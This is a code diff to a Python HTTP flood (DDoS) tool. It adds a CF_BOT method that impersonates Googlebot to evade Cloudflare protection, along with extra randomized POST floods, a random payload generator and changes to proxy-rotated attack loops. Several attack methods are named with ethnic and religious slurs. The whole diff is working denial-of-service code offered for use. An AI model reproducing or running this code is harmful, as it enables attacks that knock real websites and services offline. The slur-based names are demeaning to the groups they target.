@@ -139,7 +139,7 @@ class Methods:
         "RAGHEAD", "PAPIST", "KACAP", "LOIC", "LOIC_CF",
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "BOT", "CF_BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
     }
 
     LAYER4_AMP: Set[str] = {
@@ -162,7 +162,10 @@ google_agents = [
     "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
     "+http://www.google.com/bot.html)) "
     "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
+    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
+    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; GoogleOther)",
+    "Mozilla/5.0 (compatible; Google-InspectionTool/1.0;)",
 ]
 
 cf_description = [
@@ -780,6 +783,7 @@ class HttpFlood(Thread):
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
             "BOT": self.BOT,
+            "CF_BOT": self.CF_BOT,
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
             "KACAP": self.KACAP,
@@ -1155,7 +1159,7 @@ class HttpFlood(Thread):
                                             "KACAP", "PAPIST", "RAGHEAD", "LOIC", "LOIC_CF",
                                             "CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
-                                            "BOT", "RHEX", "STOMP"} \
+                                            "BOT", "CF_BOT", "RHEX", "STOMP"} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS", "AMAMI_CANON4"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
@@ -1341,6 +1345,37 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
+    def CF_BOT(self) -> None:
+        payload: bytes = self.generate_payload()
+        p1, p2 = str.encode(
+            "GET /robots.txt HTTP/1.1\r\n"
+            "Host: %s\r\n" % self._target.raw_authority +
+            "Connection: Keep-Alive\r\n"
+            "Accept: text/plain,text/html,*/*\r\n"
+            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
+            "GET /sitemap.xml HTTP/1.1\r\n"
+            "Host: %s\r\n" % self._target.raw_authority +
+            "Connection: Keep-Alive\r\n"
+            "Accept: */*\r\n"
+            "From: googlebot(at)googlebot.com\r\n"
+            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "Accept-Encoding: gzip,deflate,br\r\n"
+            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
+                                          ProxyTools.Random.rand_str(4)) +
+            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
+        s = None
+        with suppress(Exception), create_scraper() as s:
+            try:
+                Tools.send(s, p1)
+                Tools.send(s, p2)
+                for _ in range(self._rpc):
+                    Tools.send(s, payload)
+            except:
+                sleep(random.randint(1,2))
+            finally:
+                Tools.safe_close(s)
+
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
@@ -1393,6 +1428,12 @@ class HttpFlood(Thread):
                     with s.get(str(self._target), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.post(str(self._target) + "?=" + ProxyTools.Random.rand_str(random.randint(1,1024)), timeout=200) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.post(str(self._target) + "?=" + ProxyTools.Random.rand_str(2 ^ random.randint(1,8)), timeout=200) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
                     with s.post(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
@@ -1402,28 +1443,46 @@ class HttpFlood(Thread):
                 Tools.safe_close(s)
 
     def TANKIE_SPECIAL(self):
-        attack_method = int(random.randint(0,9))
+        attack_method = int(random.randint(0,6))
 
         if attack_method == 0:
-            self.PAPIST()
-        elif attack_method == 1:
-            self.CFTANKIE()
-        elif attack_method == 2:
-            self.CFTANKIE2()
-        elif attack_method == 3:
-            self.CF_JIN_SAN_PANG()
-        elif attack_method == 4:
-            self.CF_NO_MORE_TANKIE_RAGHEADS()
-        elif attack_method == 5:
-            self.CFFUNDIE()
-        elif attack_method == 6:
-            self.CFFUNDIE2()
-        elif attack_method == 7:
-            self.RAGHEAD()
-        elif attack_method == 8:
             self.CFPAPIST()
-        elif attack_method == 9:
-            self.LOIC_CF()
+        elif attack_method == 1:
+            self.CFTANKIE2()
+        elif attack_method == 2:
+            self.CF_JIN_SAN_PANG()
+        elif attack_method == 3:
+            self.CF_NO_MORE_TANKIE_RAGHEADS()
+        elif attack_method == 4:
+            self.CFFUNDIE2()
+        elif attack_method == 5:
+            self.CFRAGHEAD3()
+        elif attack_method == 6:
+            self.AMAMI_CANON2()
+
+    def RANDOM_PAYLOAD(self):
+        attack_method = int(random.randint(0,6))
+
+        if attack_method == 0:
+            payload: bytes = self.generate_payload(
+                ("Content-Length: 44\r\n"
+                "X-Requested-With: XMLHttpRequest\r\n"
+                "Content-Type: application/json\r\n\r\n"
+                '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
+        elif attack_method == 1:
+            payload: bytes = self.generate_payload(
+                ("Content-Length: 524\r\n"
+                "X-Requested-With: XMLHttpRequest\r\n"
+                "Content-Type: application/json\r\n\r\n"
+                '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
+        elif attack_method == 2:
+            payload: bytes = self.generate_payload(
+                "Cookie: _ga=GA%s;"
+                " _gat=1;"
+                " __cfduid=dc232334gwdsd23434542342342342475611928;"
+                " %s=%s\r\n" %
+                (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+                 ProxyTools.Random.rand_str(32)))
 
     def CF_JIN_SAN_PANG(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1550,8 +1609,7 @@ class HttpFlood(Thread):
                         with s.get(str(self._target), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
-                                   proxies=pro.asRequest(), headers=self.get_headersx(), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1656,10 +1714,10 @@ class HttpFlood(Thread):
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
-                    with s.get(str(self._target), headers=self.get_headersx(), proxies=randchoice(self._proxies).asRequest(), timeout=60) as res:
+                    with s.get(str(self._target), headers=self.get_headersx(), proxies=randchoice(self._proxies).asRequest(), timeout=120) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=randchoice(self._proxies).asRequest(), timeout=60) as res:
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=randchoice(self._proxies).asRequest(), timeout=120) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1709,11 +1767,7 @@ class HttpFlood(Thread):
 
     def CF_ATTACK_RAGHEAD(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-      
-        proxy = pro.ip_port().split(":")
+
         req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
@@ -1728,7 +1782,11 @@ class HttpFlood(Thread):
         for _ in range(self._rpc):
             try:
                 with suppress(Exception), create_scraper() as s:
-                    
+                    pro = None
+                    if self._proxies:
+                        pro = randchoice(self._proxies)
+      
+                    proxy = pro.ip_port().split(":")
                     s.connect((str(self._target), int(443)))
                     s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
